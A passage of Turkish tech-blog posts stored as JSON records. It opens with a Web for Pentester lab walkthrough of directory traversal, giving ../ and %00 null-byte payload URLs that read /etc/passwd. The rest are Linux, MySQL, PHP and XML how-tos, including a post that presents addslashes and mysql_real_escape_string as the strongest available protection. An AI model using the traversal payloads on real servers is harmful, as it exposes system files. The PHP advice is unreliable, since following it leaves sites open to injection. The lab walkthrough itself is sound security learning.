Böyle bir durumda directory traversal yani dizinler arasında dolanabilme durumu ile karşılaşılabilir. Örneğin şöyle bir url olduğunu düşünelim ?resim=resim.png burada resim.png kullanıcıya göstilebilir.İşte bu durumda eğer ?resim=./resim.png de bu dosyayı sorunsuz bir şekilde gösterebiliyorsa orada directory traversal zafiyeti var demektir. Şimdi Web for pentester'in directory traversal bölümlerine bakabiliriz. Bölüm 1 Bu bölümde doğrudan kullanıcıdan alınan dosya ismi kullanıcıya gösterilmiş. Biz de işletim sisteminin linux olduğunu bildiğimiz için bildiğimiz bir yoldaki dosyayı rahat bir şekilde ekrana basabiliyoruz. http://172.16.248.132/dirtrav/example1.php?file=../../../../../../../../../../../etc/passwd Burada ki ../ ifadesi linux işletim sisteminde bir üst dizini ifade eder. Ve ana dizine gittikten sonra yazılan ../ bir anlam ifade etmez. Yani istediğiniz kadar ../../../ ifadesi yazın gidebileceğiniz en fazla ana dizin( / )dir. Bizde ana dizine çıktıktan sonra /etc/passswd dosyasını ekrana bastık. Okunma yetkisi olan her dosyayı bu şekilde ekrana basabilirsiniz. Bölüm 2 Bu bölümde ise dosyanın yolu doğrudan belirtilmiştir. Bir öncekinde olduğumuz gibi bir üst dizine çıkmamız gerekiyor. Burada ise bu işlemi belirtilen yolu bozmadan yapacağız. Yani yanlış bir yere gitmemiz gerekiyor. Bu yüzden resmin olduğu dizine geldikten sonra bir üst dizinlere çıkmamız gerekiyor. Yazmamız gereken ifade ise şu şekilde: http://172.16.248.132/dirtrav/example2.php?file=/var/www/files/../../../../../../../../../../../../../etc/passwd Bölüm 3 Bu bölümde ise kullanıcıdan gösterilecek dosyanın uzantısı alınmamış ve kod içesinde bu uzantı eklenmiştir. Bizim istediğimiz yola giderken bir syntax hatası ile karşılaşmamak için bu eklenen uzantıyı iptal etmemiz gerekiyor. Bunuda %00 yani Null ifadesi ile yapabiliyoruz. php bu ifadeyi gördükten sonra kalan kısmı okumaz. /dirtrav/example3.php?file=../../../../../../../../../../../etc/passwd%00 Bu ifade ile dosyaya ulaşabiliyoruz.","tags":"Güvenlik","title":"Web for Pentester - Directory Traversal Bölümleri"},{"url":"http://www.mazlumagar.com/buildozer-ile-pythondan-apk-olusturma-hatasi.html","text":"Kivy ile oluşturmuş olduğunuz projeden android apk oluşturmaya çalışırken şöyle bir hata alabilirsiniz. Traceback (most recent call last): File \"build.py\", line 491, in make_package(args) File \"build.py\", line 354, in make_package subprocess.check_call([ANT, arg]) File \"/usr/lib/python2.7/subprocess.py\", line 540, in check_call raise CalledProcessError(retcode, cmd) subprocess.CalledProcessError: Command '['ant', 'debug']' returned non-zero exit status 1 # Command failed: /usr/bin/python build.py --name 'My Application' --version 1.0 --package org.test.myapp --private /home/mazlum/Python/Kivy/.buildozer/android/app --sdk 14 --minsdk 8 --orientation sensor --window debug Sistemin bazı ihtiyaçlarından dolayı bu hatayı vermektedir. Bu ihtiyaçları karşılamak için şu komutları sırası ile uygulayınız. sudo dpkg --add-architecture i386 sudo apt-get update sudo apt-get install -y build-essential ccache git zlib1g-dev python2.7 python2.7-dev libncurses5:i386 libstdc++6:i386 zlib1g:i386 openjdk-7-jdk unzip Bu komutları sırası ile takip edince sorununuz ortadan kalkacaktır.","tags":"Python","title":"Buildozer ile Python'dan Apk Oluşturma Hatası"},{"url":"http://www.mazlumagar.com/linux-debian-dagitimlarinda-kisayol-dosyasi-olusturmak.html","text":"Merhabalar, Bu yazımda Ubuntu üzerinde bir program için nasıl kısayol oluşturulur onu göstereceğim. İlk önce herhangi bir yerde dosyaadi.desktop şeklinde bir dosya oluşturmanız gerekiyor. Ben kısayolu arama işlemi yaparken de bulabilmek için Linux'un kısayolları tuttuğu dizin içerisinde oluşturacağım. Bunun için /usr/share/applications dizini içerisinde idea.desktop adında bir dizin oluşturarak bu dosyayı vi ile açtıktan sonra içerisine şu kodları yapıştırdım. [Desktop Entry] Name = IntelliJ IDEA Comment = IntelliJ IDEA IDE Exec = /home/mazlum/bin/idea-IU-135.909/bin/idea.sh Icon = /home/mazlum/bin/idea-IU-135.909/bin/idea.png Terminal = false StartupNotify = true Type = Application Categories = Development;IDE; Bunları yazdıktan sonra kısayolumuz hazır. Arama işlemi yaparak kısa yola ulaşabilirsiniz. Kısayola tıklandığında program çalışacaktır. Şimdi kodları açıklayalım. 2.satır : Programın adı. 3.satır : Program hakkında yorum. 4.satır : Programın yolu. 5.satır : Kısayol üzerinde görünecek ikon yolu.","tags":"Linux","title":"Linux - Debian Dağıtımlarında Kısayol Dosyası Oluşturmak"},{"url":"http://www.mazlumagar.com/phpmyadmin-konfigurasyon-ayarlarini-sifirlamak.html","text":"Merhaba, Yanlışlıkla phpmyadminin bulunduğu dizinin izinlerini değiştirebilirsiniz. Bu izin değiştirmeden sonra bazı sıkıntılar ile karşılaşmanız muhtemel. Bu sıkıntılar phpmyadmine girememek yada herhangi bir tabloya müdahale edememek gibi şeyler olabilir. Bunun için phpmyadminin konfigürasyon ayarlarını sıfırlayabilirsiniz. Terminalden şu komutu vermeniz yeterli. sudo dpkg-reconfigure phpmyadmin","tags":"Linux","title":"Phpmyadmin Konfigürasyon Ayarlarını Sıfırlamak"},{"url":"http://www.mazlumagar.com/general-mobile-discovery-usb-driver.html","text":"Bende Türkiye'de geçen yılın trendi olan General Mobile'ı kullanıyorum. Android uygulaması yazmak isteyenler yazdıkları uygulamayı test edebilmek için usb driverı kurmak zorundalar. Bilgisayarın telefonu flash bellek gibi değil de cihaz olarak tanıyabilmesi için bu sürücüye ihtiyacı var. General Mobile'ın ise böyle bir sürücü yok. Yani en azından ben bulamadım. Hatta Telpa'ya kendi sitesinden 2 kere mail attım ama geri dönüş yapmadılar. Bende General Mobile'ın yurt dışı üretimli bir telefon olduğunu yani Telpa'nın üretmediğini duymuştum. İnternet üzerinde böyle arama yaptım ve gerçekten de telefonun asıl üreticisi Blue Mobile adında bir şirket olduğunu öğrendim.Telefonun orjinal adı da life play. Telefona buradan bakabilirsiniz. Bunu öğrendikten sonra işim kolay oldu tabi ki. Google'a \"Blue Mobile Life Play USB Driver\" yazdım ve ilk sonuçta sürücüyü buldum. Sürücüyü indirdikten sonra bilgisayarınıza kurun. Artık yazdığınız uygulamayı cihazınızda deneyebilirsiniz. Sürücüyü buradan indirebilirsiniz.","tags":"Teknoloji","title":"General Mobile Discovery USB Driver"},{"url":"http://www.mazlumagar.com/ubuntu-uzerine-vmware-workstation-kurulumu.html","text":"Merhaba arkadaşlar bu yazımda iki gündür beni uğraştıran ve deli eden ama sonunda başardığım VMware Workstation kurulumunu sizler ile paylaşacağım. VMware Workstation'ı adresinden adresinden indiriyoruz.İndirdiğimiz dosyayı çalıştırılabilir hale getiriyoruz. Tabi bu komutları yazmadan önce indirdiğiniz dosya ile aynı klasörde olmanız gerektiğini unutmayın chmod +x VMware-Workstation-Full-10.0.1-1379776.i386.bundle Ardından sıradaki komut ile kurulumu yapıyoruz. sudo ./VMware-Workstation-Full-10.0.1-1379776.i386.bundle Bu komutu yazdıktan sonra karşımıza kurulum penceresi geliyor ve next butonları ile kurulumu tamamlıyoruz. Ancak ben bu şekilde kurulumu yaparken \"installation was unsuccessful\" şeklinde hata aldım. Eğer sizde benim gibi bu hatayı alırsanız yazmanız gereken komutlar sırası ile şunlar. sudo dpkg-reconfigure locales sudo LANG=en bash ./VMware-Workstation-Full-10.0.1-1379776.i386.bundle Bu komutları yazdıktan sonra tekrardan karşınıza kurulum penceresi gelecektir. Bundan sonra adımları takip ederseniz sorunsuz kurulacaktır. En azından bende öyle oldu sizde de öyle olması dileğiyle kolay gelsin.","tags":"Linux","title":"Ubuntu Üzerine VMware Workstation Kurulumu"},{"url":"http://www.mazlumagar.com/ubuntu-teamviewer-kurulumu.html","text":"Merhaba arkadaşlar bu yazımda Ubuntu'ya TeamViewer nasıl kurulur ondan bahsedeceğim. Gerçi ben Elementary Os kullanıyorum ama bir önceki yazımda da dediğim gibi bir fark yok. TeamViewer Ubuntu'nun deposunda bulunmuyor. Bu yüzden bildiğimiz yoldan değil de farklı bir yoldan gideceğiz. İlk önce TeamViewer 'ın kendi sitesindeki donwload sekmesinden sistemimize uygun olanı indiriyoruz. 32 bit sistem kullanıyorsanız 32 bit olanı 64 bit sistem kullanıyorsanız 64 bit olanı kullanmalısınız. TeamViewer'ı indirdikten sonra hangi dizine indiyse o dizine gitmeliyiz. Eğer indirdiğiniz yer üzerinde değişiklik yapmadıysanız İndirilenler dizinine inecektir. cd İndirilenler Bu komut ile İndirilenler dizinini açıyoruz. 32 Bit Sistem için: sudo dpkg -i teamviewer_linux.deb 64 Bit Sistem için: sudo dpkg -i teamviewer_linux_x64.deb Bu komut ile de indirdiğimiz TeamViewer'ı Sistemimize kuruyoruz. Teamviewer'ımız hazır. Kolay gelsin :)","tags":"Linux","title":"Ubuntu TeamViewer Kurulumu"},{"url":"http://www.mazlumagar.com/ckeditor-resim-upload-islemi.html","text":"Merhaba arkadaşlar Ckeditor gerçekten çok güzel bir metin editörü. Fakat yeni sürümlerinde resim upload sekmesi gelmiyor. Bu işlem için CkFinder'ın satın alınması gerekiyor. Bende uzun uğraşlar sonunda öğrendiğim resim upload sekmesini nasıl aktif hale getirdiğimizi sizinle paylaşmak istiyorum. İlk önce ckeditor klasörü içindeki config.js dosyasına şu kodu ekleyin. config.filebrowserUploadUrl = '/uploader/upload.php'; Bu kod parçası ile upload sekmesini aktif hale getirdik. Şimdi buraya tıklayarak klasörü indirin ve projenizin ana dizinine kopyalayın. Hepsi bu kadar artık Ckeditor ile resim yükleyebilirsiniz. Yüklediğiniz resimler ana dizinde uploads adında bir klasör oluşturulup oraya kaydedilecek. Not: Önemli bir notu siz söylemek istiyorum.Eğer htaccess kullanıyorsanız, Uploader klasörüne ve Uploads klasörüne erişim izni vermek zorundasınız. Eğer vermezseniz upload.php dosyasına erişilemez ve upload işlemi başarısız olur. Hepinize kolay gelsin.","tags":"Php","title":"CKeditor Resim Upload İşlemi"},{"url":"http://www.mazlumagar.com/ubuntuda-htaccess-dosyasi-olusturma.html","text":"Merhaba arkadaşlar bu yazımda Ubuntu'da htaccess dosyası nasıl oluşturulur ondan bahsetmek istiyorum. htaccess dosyaları sisteme yük getirdiği için Ubuntu'da htaccess dosyaları default olarak okunmamaktadır. Biz sistemimizde bunu okunur hale getireceğiz. İlk önce mod_rewrış olması gerekir. Bir sitenin kök dizininde (ya da alt dizinlerinde) bulunabilecek .htaccess dosyalarındaki yapılandırma ayarlarının okunup, devreye alınabilmesi için, Apache ana yapılandırma dosyasında (httpd.conf) ilgili web sitesine (ya da DocumentRoot'un kendisine) ait ‹Directory› etiketi altında tanımlanan AllowOverride direktifinin \"None\" yerine All (ya da en azından Fileinfo) olarak set edilmiş olması gerekir. Ubuntu da bu performans kaygılarından dolayı None olarak gelmektedir. /etc/apache2/sites-enabled/default Bu yolu izleyerek default dosyasını açtığınız zaman şu şekilde bir görüntü ile karşılaşacaksınız. ServerAdmin webmaster@localhost DocumentRoot /var/www Options FollowSymLinks AllowOverride None Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all ... İşte burada AllowOverride None kısımlarını AllowOverride All şeklinde değiştirmemiz gerekmektedir. Bu ayarlarımızı yaptıkdan sonra apache'yi restart etmeyi unutmamalıyız. /etc/init.d/apache2 restart Artık htaccess dosyalarınızı kullanabilirsiniz. Kolay gelsin.","tags":"Linux","title":"Ubuntu'da htaccess Dosyası Oluşturma"},{"url":"http://www.mazlumagar.com/ubuntuda-mysql-sifresini-yenilemek.html","text":"Merhaba arkadaşlar bu yazımda Ubuntu'da unuttuğumuz MYSQL şifremizi nasıl değiştiririz ondan bahsetmek istiyorum. Bugün bana lazım oldu ve bende internetten bulduktan sonra sorunsuz değiştirdim. Bu işlem sırasında eski şifrenizi göremezsiniz. Sadece yeni şifre oluşturabilirsiniz. Bu işlemleri yapmadan önce uç birimde root olmanız gerektiğini bilmelisiniz. İlk önce uç birimi açıyoruz. Uç birimde şu kodu yazarak MYSQL servisini durduruyoruz. sudo service mysql stop 3.Mysqli durdurduktan sonra; Güvenlik bilgilerinin kayıtlı olduğu tabloya ulaşıyoruz. sudo mysqld --skip-grant-tables & 4.Şimdi sıra geldi MYSQL'e bağlanmaya. Bu komut ile de bu işlemi yapıyoruz. mysql -u root mysql 5.MYSQL'e bağlandığımıza göre artık şifremizi değiştirebiliriz. Aşağıdaki komutu aynen yazın ve 'yeni_parola' kısmına oluşturmak istediğiniz parolayı yazarak yeni parolanızı oluşturun. UPDATE user SET Password=PASSWORD('yeni_parola') WHERE user='root'; 6.MYSQL Tablolarını yeni haline güncelleyelim. FLUSH PRIVILEGES; 7.Güncellemeyi de yaptıktan sonra \"quit\" yazarak MYSQL'den çıkabilirsiniz. 8.Son olarak durdurgumuz MYSQL servisini yeniden başlatalım. sudo service mysql start Hepsi bu kadar artık yeni şifrenize sahipsiniz.Kolay Gelsin..","tags":"Linux","title":"Ubuntu'da Mysql Şifresini Yenilemek"},{"url":"http://www.mazlumagar.com/php-guvenlik.html","text":"Merhaba arkadaşlar bu yazımda PHP Güvenlik fonksiyonlarından bahsetmek istiyorum.Bu fonksiyonlar ile POST ve GET metodları ile kullanıcıdan gelen verileri filtreleyerek alıyoruz.Bunu yapmamızın sebebi kullanıcı bize veri gönderirken bizim SQL sorgumuzu değiştirerek veya veritabanamıza ulaşarak bizim bilgilerimizi elde edebilir.İşte bizde bu tür olayların önüne geçebilmek için bu fonksiyonları kullanabiliriz. Kullanılması Gereken Fonksiyonlar trim() => Baştaki ve sondaki boşlukları kaldırır. Aşağıda yazdığım üç fonksiyondan birini kullanmamız bizim için yeterlidir. strip_tags() => HTML etiketlerini kabul etmez ve siler,silinmemesini istediğimiz etiketleri ikinci değer olarak yazabiliriz htmlspecialchars() => SCRIPT kodlarında olan < > işaretlerini özel koda dönüştürür. htmlentities()=> SCRIPT kodlarında olan < > işaretlerini özel koda dönüştürür. Form ile veri gönderirken sitemize zarar vermek isteyen birisi bizim SQL sorgumuzu değiştirebilir.Bunu yaparak sitemize zarar verebilir.SQL sorgumuzu değiştirebilmesi için tırnak işareti kullanmak zorundadır.Bu tırnak işaretini etkisiz hale getirebilmek için ağağıdaki fonksiyonlardan birini kullanabiliriz. addslashes() => Bu fonksiyon kullanılan tırnak işareti başına ters slash işareti koyarak onu etkisiz kılar. mysql_real_escape_string() => addslashes ile aynı görevi görür. Örnek Uygulama $ veri = mysql_real_escape_string(htmlspecialchars(trim( $ _POST [\"veri\"]))); İşte bu fonksiyonları kullanarak sitemizde güvenlik adına alabileceğimiz en yüksek önlemleri almış oluruz.Tabi tam güvenlik diye bir şey yoktur.Biz bunları yaptıktan sonra gerisi sitemizi aldığımız hosting şirketine kalmıştır.Eğer onda güvenlik açıkları varsa bizim yapabilecek birşeyimiz yoktur.","tags":"Güvenlik","title":"PHP Güvenlik"},{"url":"http://www.mazlumagar.com/xslextensible-stylesheet-language.html","text":"Eğer XSL tanım yapmak istersek; XSL ( Extensible Style Language ) bir XML document'in başka biçimlere dönüştürmeye yarayan dildir. XML document'i başka bir XML'e, Text'e veya HTML dönüştürülebilir. XSL'in kendisi XML'de yazılmıştır. Başka bir deyişle XSL, XML formatında yazılmış element ve attribute'lerden oluşur. Yani bir XML dosyasını Web tarayıcılarında göstermeye çalışırsak,tarayıcı XML dosyasını kod şeklinde göstereceği için anlaşılır olmayacaktır.Anlaşılır olması için XML dosyasını HTML'e dönüştürüyoruz.Bu dönüştürme işlemini de XSL ile yapıyoruz. XSL Bölümleri XSL üç bölümden oluşur.Bunlar; XSLT: Css ve HTML kullanarak görsel olarak göstermemizi sağlar. XPath: Filtreleme yapmamızı sağlar.Yani koşul veya koşullara göre göstermemizi sağlar. XSL-FO: XML dökümanını PDF olarak aktarmak ve ya A4 kağıdı standartlarına aktarmak gibi işlemler için kullanırız. Örnek Uygulama Burada arkadaşlar kitaplar adında bir XML dosyasımız için ilk XSD dosyamızı oluşturacağız.Ardından bu XSD dosyamız üzerinden XML dosyamızı oluşturacağız.Ve en son olarak da XSL dosyamızı oluşturup XML dosyasının web tarayıcısında nasıl göründüğüne bakacağız. İlk Önce kitaplar.xsd dosyamızı bu şekilde oluşturduk. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <schema xmlns= \"http://www.w3.org/2001/XMLSchema\" targetNamespace= \"http://www.example.org/kitaplar\" xmlns:tns= \"http://www.example.org/kitaplar\" elementFormDefault= \"unqualified\" > <complexType name= \"yazarTipi\" > <sequence> <element name= \"isim\" type= \"string\" ></element> <element name= \"soyisim\" type= \"string\" ></element> </sequence> </complexType> <complexType name= \"kitapTipi\" > <sequence> <element name= \"ad\" type= \"string\" ></element> <element name= \"sene\" type= \"int\" ></element> <element name= \"kategori\" type= \"string\" ></element> <element name= \"yazar\" type= \"tns:yazarTipi\" ></element> </sequence> <attribute name= \"no\" use= \"required\" > <simpleType> <restriction base= \"int\" ></restriction> </simpleType> </attribute> </complexType> <complexType name= \"kitaplarTipi\" > <sequence> <element name= \"kitap\" type= \"tns:kitapTipi\" minOccurs= \"1\" maxOccurs= \"unbounded\" ></element> </sequence> </complexType> <element name= \"kitaplar\" type= \"tns:kitaplarTipi\" ></element> </schema> Sonra XSD dosyamız üzerinden XML dosyamızı oluşturduk.Burada <?xml-stylesheet type=\"text/xsl\" href=\"kitaplar.xsl\" ?> koduna dikkat ediniz.Bu kod ile XML dosyamıza XSL dosyamızı çağırdık.Aynı yerde oldukları için direk adını yazmamız yeterli oldu. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <?xml-stylesheet type=\"text/xsl\" href=\"kitaplar.xsl\"?> <kitaplar xmlns:tns= \"http://www.example.org/kitaplar\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.example.org/kitaplar kitaplar.xsd \" > <kitap no= \"0\" > <ad> XML </ad> <sene> 1993 </sene> <kategori> BİLGİSAYAR </kategori> <yazar> <isim> Mazlum </isim> <soyisim> Ağar </soyisim> </yazar> </kitap> <kitap no= \"1\" > <ad> Veritabanına Bağlama </ad> <sene> 2006 </sene> <kategori> BİLGİSAYAR </kategori> <yazar> <isim> Deneme </isim> <soyisim> Yazar </soyisim> </yazar> </kitap> <kitap no= \"2\" > <ad> Kinya ve Kayra </ad> <sene> 2012 </sene> <kategori> Felsefe </kategori> <yazar> <isim> Hakan </isim> <soyisim> Gündoğ </soyisim> </yazar> </kitap> <kitap no= \"4\" > <ad> Çocuk Gelişim </ad> <sene> 2003 </sene> <kategori> Felsefe </kategori> <yazar> <isim> Hakan </isim> <soyisim> Yok </soyisim> </yazar> </kitap> <kitap no= \"5\" > <ad> Php ve Mysql </ad> <sene> 2008 </sene> <kategori> BİLGİSAYAR </kategori> <yazar> <isim> Erkan </isim> <soyisim> Balaban </soyisim> </yazar> </kitap> </kitaplar> Son olarak XSL dosyamız ile XML dosyamızdaki verileri listeledik.Bu listelemede koşul,[a-z][z-a] şeklinde sıralama gibi ifadeler kullanabiliriz.Aşağıdaki örneklerde bir kaç uygulama yaptık. ifadesi ile döngüye sokarak XML dosyamızdaki verileri çekiyoruz. Bu ifade ile kategorisi BİLGİSAYAR olan kitapları çağırdık. Bu ifade ile ad alanında [a-z] sıralama yaptık. Bu ifade ile koşul belirttik.Sene alanı 2005 den büyük olanları çağırdık. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <xsl:stylesheet version= \"1.0\" xmlns:xsl= \"http://www.w3.org/1999/XSL/Transform\" > <xsl:template match= \"/\" > <html> <body> <h2> Kitaplar </h2> <table border= \"1\" > <tr> <td> No </td> <td> Adı </td> <td> Kategori </td> <td> Sene </td> <td> Yazar </td> </tr> <xsl:for-each select= \"kitaplar/kitap\" > <tr> <td> <xsl:value-of select= \"@no\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"ad\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"kategori\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"sene\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"yazar/isim\" > </xsl:value-of> <xsl:value-of select= \"yazar/soyisim\" > </xsl:value-of> </td> </tr> </xsl:for-each> </table> <h2> Kategorisi BİLGİSAYAR olan Kitaplar </h2> <table border= \"1\" > <tr> <td> No </td> <td> Adı </td> <td> Kategori </td> <td> Sene </td> <td> Yazar </td> </tr> <xsl:for-each select= \"kitaplar/kitap[kategori='BİLGİSAYAR']\" > <tr> <td> <xsl:value-of select= \"@no\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"ad\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"kategori\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"sene\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"yazar/isim\" > </xsl:value-of> <xsl:value-of select= \"yazar/soyisim\" > </xsl:value-of> </td> </tr> </xsl:for-each> </table> <h2> Ada Göre Alfabetik olarak Sıralanmış Kitaplar </h2> <table border= \"1\" > <tr> <td> No </td> <td> Adı </td> <td> Kategori </td> <td> Sene </td> <td> Yazar </td> </tr> <xsl:for-each select= \"kitaplar/kitap\" > <xsl:sort select= \"ad\" order= \"descending\" > </xsl:sort> <tr> <td> <xsl:value-of select= \"@no\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"ad\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"kategori\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"sene\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"yazar/isim\" > </xsl:value-of> <xsl:value-of select= \"yazar/soyisim\" > </xsl:value-of> </td> </tr> </xsl:for-each> </table> <h2> Senesi 2005den büyük Olan kitaplar </h2> <table border= \"1\" > <tr> <td> No </td> <td> Adı </td> <td> Kategori </td> <td> Sene </td> <td> Yazar </td> </tr> <xsl:for-each select= \"kitaplar/kitap\" > <xsl:if test= \"sene &gt; 2005\" > <tr> <td> <xsl:value-of select= \"@no\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"ad\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"kategori\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"sene\" > </xsl:value-of> </td> <td> <xsl:value-of select= \"yazar/isim\" > </xsl:value-of> <xsl:value-of select= \"yazar/soyisim\" > </xsl:value-of> </td> </tr> </xsl:if> </xsl:for-each> </table> </body> </html> </xsl:template> </xsl:stylesheet> Bu oluştuduğumuz XML dosyası XSD dosyamız sayesinde Web tarayıcımızda aşağıdaki gibi görünecektir.","tags":"XML","title":"XSL(eXtensible Stylesheet Language)"},{"url":"http://www.mazlumagar.com/xsdxml-schema-definition.html","text":"Merhaba arkadaşlar bu yazımda da tıpkı DTD gibi bir XML standartlaştırma yapısı olan XSD'den bahsedeceğim.XSD'nin kullanımı XML'e daha uygundur.Yapısı da zaten XML ile aynıdır.Yani tıpkı XML deki gibi açılan bir tag kapatılmak zorundadır.Ama DTD de açılan tagları kapamıyorduk.Zaten bu yüzden de genelde XSD kullanılır. XSD ile nelere karar veririz? Hangi elementler bulunacak. Hangi öznitelikler bulunacak. Hangi elementler çocuk element olacak. Çocuk elementler hangi sırada olacaklar. Elementlerin sayısı ne olacak. Hangi elementler boş hangileri sadece text içerecekler. Elementlerin ve özniteliklerin veri tipleri ne olacak. Elementlerin ve öznitelikler için default ve fix(sabit) değerler neler olacak. <shema> Elementi <schema> elementi bir XSD dokümanında kesinlikle bulunmalıdır. Bu element XSD dokümanının kok (root) elementidir ve bazı özniteliklere sahiptir. Bu öznitelikler doküman hakkında bazı bilgileri vermek içi kullanılırlar. <span style= \"color: #557755;\" > &lt; ?xml version=\"1.0\"? &gt; </span> <span style= \"color: #557755;\" > &lt; xs:schema </span> <span style= \"color: #557755;\" > xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" </span> <span style= \"color: #557755;\" > targetNamespace=\"http://www.mazlumagar.com\" </span> <span style= \"color: #557755;\" > xmlns=\"http://www.mazlumagar.com\" &gt;&lt; /xs:schema &gt; </span> xmlns:xs => bu öznitelik yapacağımız tanımların http://www.w3.org/2001/XMLSchema standartlarına göre yapacağımızı göstermektedir. targetNamespace => bu öznitelik doküman içerisinde yapacağımız tanımların özniteliğe verilen isim alanından geldiğini belirtir. xmlns => bu öznitelik dokümanın bağlı bulunduğu isim alanını belirtir. Bir XML dokümanı içerisinde XSD dokümanı şu şekilde belirtilir <span style= \"color: #557755;\" > &lt; ?xml version=\"1.0\"? &gt; </span> <span style= \"color: #557755;\" > &lt; note xmlns=\"http:// mazlumagar.com \" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" </span> <span style= \"color: #557755;\" > xsi:schemaLocation=\"http://www.mazlumagar.com ogrenciler.xsd\" &gt; </span> SIMPLE ve COMPLEX Elementler SIMPLE ELEMENT İçeriğinde hiçbir bilgi içermeyen elementlerdir.İçeriğinde herhangi bir text olabilir. COMPLEX ELEMENT SIMPLE element olmayan diğer bütün elementlere denir. ELEMENT Tanımlaması <xs:element name=\"[ElementAdi]\" type=\"[ElementTipi]\" /> Desteklenen bazı tipler xs : boolean xs : date xs : decimal xs : integer xs : string xs : time default=\"default değeri\" => İçeriğine her zaman default değeri ile belirtilen ifade yazılacaktır. fixed=\"value\" => İçeriği her zaman aynı değeri taşıyacaktır. ATTRİBUTES tanımlaması <xs:attribute name=\"[attrAdi]\" type=\"[a datatype]\" /> default=\"default değeri\" => İçeriğine her zaman default değeri ile belirtilen ifade yazılacaktır. fixed=\"value\" => İçeriği her zaman aynı değeri taşıyacaktır. use=\"optional\" => Attribute isteğe bağlıdır. use=\"required\" => Attribute zorunludur. Yeni Tip Oluşturma XSD'de xs:string,xs:decimal tipler gibi bizde kendimiz tip oluşturabiliriz. Örnek tip oluşturma.0-100 arasında sayı değeri alan tip <xs:simpleType> <xs:restriction base= \"xs:integer\" > <xs:minInclusive value= \"0″/ > <xs:maxInclusive value= \"100″/ > </xs:restriction> </xs:simpleType> Yeni oluşturulan Tipi Kullanma Oluşturduğumuz tipi iki şekilde kullanabiliriz.Birincisi bir elementin içinde direk tanımlayabiliriz. <xs:element name= \"no\" type= \"xs:string\" use= \"optional\" > Tip buraya </xs:element> İkincisi ise bir isim vererek fonksiyon haline getirip birden fazla yerde kullanabiliriz. <xs:element name= \"test\" type= \"tipAdi\"/ > <xs:simpleType name= \"tipAdi\" > … </xs:simpleType> DataType için kullanılan Sınırlandırmalar enumeration : Bir değer listesi tanımlar. Listede olmayan bir değer verilemez. fractionDigits: decimal alanın maxsimum değeri length : string veya list gibi tiplerde boy değeri maxExclusive : Sayısal ve liste değerleri için üst sınır maxInclusive: Sayısal ve liste değerleri için üst sınır maxLength: string veya listeler için girilebilecek maxsimum boy. minExclusive: Sayısal ve liste değerleri için alt sınır. minInclusive: Sayısal ve liste değerleri için alt sınır minLength: string veya listeler için girilebilecek minimum boy pattern: string değerinin uymak zorunda olduğu şablon totalDigits: sayı tipleri için girilebilecek rakam miktarı whiteSpace: whitespace karakterlere bir işlem yapmak için Belirli değerler dizisi yaratılabilir. Örneğin mevsim seçimi olan bir tip yaratılabilir. <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:enumeration value= \"Yaz\"/ > <xs:enumeration value= \"Kış\"/ > <xs:enumeration value= \"ilkBahar\"/ > <xs:enumeration value= \"sonBahar\"/ > </xs:restriction> <xs:simpleType> Belirli yapıya uyan değer tipleri yaratılabilir. Örneğin tek bir harf alan değer tipi yaratılabilir. <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:pattern value= \"[a-z]\"/ > </xs:restriction> </xs:simpleType> Bir tipin whitespace karakterlerini desteklemesi sağlanabilir. <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:whiteSpace value= \"replace\"/ > </xs:restriction> </xs:simpleType> Referenas gösterme <xs:element name=\"Ogretmen\" ref=\"AdSoyad\" /> Burada ogretmen elementine AdSoyad elementini referans görterdik.Artık ogretmen AdSoyadın tüm özelliklerini taşıyacak maxOccurs ve minOccurs Bir elementin kaç kere kullanılabilecğini bildirir. Varsayılan olarak iki değerde 1'dir. minOccurs en az kaç kere kullanılması gerektiği, maxOccurs ise en fazla kaç kere kullanılması gerektiğini belirtir. <xs:element name=\"name\" type=\"xs:string\" maxOccurs=\"10″ minOccurs=\"0″/> name elementi hiç kullanılmayabilir ve en fazla 10 tane kullanılabilir. Örnek XSD Uygulaması XML Nedir? başlıklı yazıda oluşturduğumuz XML dosyasının bu sefer de XSD dosyasını oluşturalım.Bu örnekte arkadaşlar biz referans göstermenin farklı bir yolunu kullandık.XSD dosyası direk XML dosyası gibi iç içe de yazılabilir.Ama bu şekilde kullanmak hem göze daha hoş geliyor hem de daha rahat yazmamızı sağlıyor. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <schema xmlns= \"http://www.w3.org/2001/XMLSchema\" targetNamespace= \"http://www.mazlumagar.com\" xmlns:tns= \"http://www.mazlumagar.com\" elementFormDefault= \"unqualified\" > <complexType name= \"adrestipi\" > <sequence> <element name= \"sehir\" type= \"string\" ></element> <element name= \"cadde\" type= \"string\" ></element> <element name= \"mahalle\" type= \"string\" ></element> </sequence> </complexType> <complexType name= \"derstipi\" > <sequence> <element name= \"kod\" type= \"int\" ></element> <element name= \"Adı\" type= \"string\" ></element> </sequence> </complexType> <complexType name= \"derslertipi\" > <sequence> <element name= \"ders\" type= \"tns:derstipi\" minOccurs= \"1\" maxOccurs= \"unbounded\" ></element> </sequence> </complexType> <complexType name= \"ogrencitipi\" > <sequence> <element name= \"isim\" type= \"string\" ></element> <element name= \"soyad\" type= \"string\" ></element> <element name= \"adres\" type= \"tns:adrestipi\" ></element> <element name= \"dersler\" type= \"tns:derslertipi\" ></element> </sequence> <attribute name= \"no\" type= \"int\" ></attribute> 